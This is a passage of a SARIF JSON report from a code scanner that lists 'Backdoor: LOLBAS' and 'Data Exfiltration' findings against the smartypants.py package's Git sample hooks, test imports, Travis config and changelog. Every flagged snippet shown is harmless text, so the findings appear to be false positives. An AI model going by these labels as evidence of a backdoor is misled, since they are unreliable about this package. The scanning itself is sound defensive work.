                      "text": "\t\t\t# New branch, examine all commits\n\t\t\trange=\"$local_oid\"\n\t\telse\n\t\t\t# Update to existing branch, examine new commits\n\t\t\trange=\"$remote_oid..$local_oid\"\n\t\tfi\n\n",
                      "markdown": "`\t\t\t# New branch, examine all commits\n\t\t\trange=\"$local_oid\"\n\t\telse\n\t\t\t# Update to existing branch, examine new commits\n\t\t\trange=\"$remote_oid..$local_oid\"\n\t\tfi\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-push.sample"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 18,
                  "endLine": 5,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n# This hook is called with the following parameters:\n#\n",
                    "rendered": {
                      "text": "\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n# This hook is called with the following parameters:\n#\n",
                      "markdown": "`\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n# This hook is called with the following parameters:\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-push.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to verify what is about to be pushed.  Called by \"git\n# push\" after it has checked the remote status, but before anything has been\n# pushed.  If this script exits with a non-zero status nothing will be pushed.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/applypatch-msg.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message taken by\n# applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message taken by\n# applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to check the commit log message taken by\n# applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/tests/test.py"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 16,
                  "endLine": 9,
                  "snippet": {
                    "text": "\nimport doctest\nimport unittest\nfrom time import time\n\nimport smartypants\nfrom smartypants import smartypants as sp\nfrom smartypants import Attr\n",
                    "rendered": {
                      "text": "\nimport doctest\nimport unittest\nfrom time import time\n\nimport smartypants\nfrom smartypants import smartypants as sp\nfrom smartypants import Attr\n",
                      "markdown": "`\nimport doctest\nimport unittest\nfrom time import time\n\nimport smartypants\nfrom smartypants import smartypants as sp\nfrom smartypants import Attr\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/tests/test.py"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 4,
                  "endLine": 8,
                  "endColumn": 10,
                  "snippet": {
                    "text": "\nimport doctest\nimport unittest\nfrom time import time\n\nimport smartypants\nfrom smartypants import smartypants as sp\n",
                    "rendered": {
                      "text": "\nimport doctest\nimport unittest\nfrom time import time\n\nimport smartypants\nfrom smartypants import smartypants as sp\n",
                      "markdown": "`\nimport doctest\nimport unittest\nfrom time import time\n\nimport smartypants\nfrom smartypants import smartypants as sp\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.travis.yml"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 3,
                  "endLine": 10,
                  "endColumn": 8,
                  "snippet": {
                    "text": "  - \"3.6\"\n  - \"nightly\"\ninstall:\n  - pip install .\nscript:\n  - python setup.py test\n",
                    "rendered": {
                      "text": "  - \"3.6\"\n  - \"nightly\"\ninstall:\n  - pip install .\nscript:\n  - python setup.py test\n",
                      "markdown": "`  - \"3.6\"\n  - \"nightly\"\ninstall:\n  - pip install .\nscript:\n  - python setup.py test\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/CHANGES.rst"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 17,
                  "endLine": 10,
                  "endColumn": 21,
                  "snippet": {
                    "text": "  - use reStructuredText as much as possible, code in backticks or code blocks\n  - no period in the end of line\n  - lower case, base form, e.g. \"add\" and \"remove\" not \"added\" nor \"adds\"\n  - line wrapping at 80 characters, i.e. max line length is 79 characters\n  - use symbols, even though they look same in Sphinx doc\n\n    - \"*\" for modifications, fixes, or a set of grouped changes\n",
                    "rendered": {
                      "text": "  - use reStructuredText as much as possible, code in backticks or code blocks\n  - no period in the end of line\n  - lower case, base form, e.g. \"add\" and \"remove\" not \"added\" nor \"adds\"\n  - line wrapping at 80 characters, i.e. max line length is 79 characters\n  - use symbols, even though they look same in Sphinx doc\n\n    - \"*\" for modifications, fixes, or a set of grouped changes\n",
                      "markdown": "`  - use reStructuredText as much as possible, code in backticks or code blocks\n  - no period in the end of line\n  - lower case, base form, e.g. \"add\" and \"remove\" not \"added\" nor \"adds\"\n  - line wrapping at 80 characters, i.e. max line length is 79 characters\n  - use symbols, even though they look same in Sphinx doc\n\n    - \"*\" for modifications, fixes, or a set of grouped changes\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/CHANGES.rst"
                },
                "region": {
                  "startLine": 207,
                  "startColumn": 9,
                  "endLine": 208,
                  "snippet": {
                    "text": "\n+ add Python 3 support\n+ add unittest and checks\n+ add CLI script\n\nReleases 1.6\n============\n\n",
                    "rendered": {
                      "text": "\n+ add Python 3 support\n+ add unittest and checks\n+ add CLI script\n\nReleases 1.6\n============\n\n",
                      "markdown": "`\n+ add Python 3 support\n+ add unittest and checks\n+ add CLI script\n\nReleases 1.6\n============\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/CHANGES.rst"
                },
                "region": {
                  "startLine": 132,
                  "startColumn": 5,
                  "endLine": 132,
                  "endColumn": 11,
                  "snippet": {
                    "text": "\n* fix ``---`` being converted in ``educateDashes``\n\n  The Perl doesn't do such, and it's possibly a mistaken in\n  version v1.5_1.5 (eed4a8a16f11)\n\n  If you want the same behavior with default attributes, you need to use\n",
                    "rendered": {
                      "text": "\n* fix ``---`` being converted in ``educateDashes``\n\n  The Perl doesn't do such, and it's possibly a mistaken in\n  version v1.5_1.5 (eed4a8a16f11)\n\n  If you want the same behavior with default attributes, you need to use\n",
                      "markdown": "`\n* fix ``---`` being converted in ``educateDashes``\n\n  The Perl doesn't do such, and it's possibly a mistaken in\n  version v1.5_1.5 (eed4a8a16f11)\n\n  If you want the same behavior with default attributes, you need to use\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/CHANGES.rst"
                },
                "region": {
                  "startLine": 92,
                  "startColumn": 18,
                  "endLine": 92,
                  "endColumn": 66,
                  "snippet": {
                    "text": "\n  + add ``LC_ALL=C`` test for locale setting on ``setup.py`` wrt #5\n\n  * change virtualenv invocation method in ``install_test`` target\n\n* fix UnicodeDecodeError on opening ``smartypants.py``, which includes Unicode\n  characters, when running ``setup.py`` with Python 3 and specific locales\n",
                    "rendered": {
                      "text": "\n  + add ``LC_ALL=C`` test for locale setting on ``setup.py`` wrt #5\n\n  * change virtualenv invocation method in ``install_test`` target\n\n* fix UnicodeDecodeError on opening ``smartypants.py``, which includes Unicode\n  characters, when running ``setup.py`` with Python 3 and specific locales\n",
                      "markdown": "`\n  + add ``LC_ALL=C`` test for locale setting on ``setup.py`` wrt #5\n\n  * change virtualenv invocation method in ``install_test`` target\n\n* fix UnicodeDecodeError on opening ``smartypants.py``, which includes Unicode\n  characters, when running ``setup.py`` with Python 3 and specific locales\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}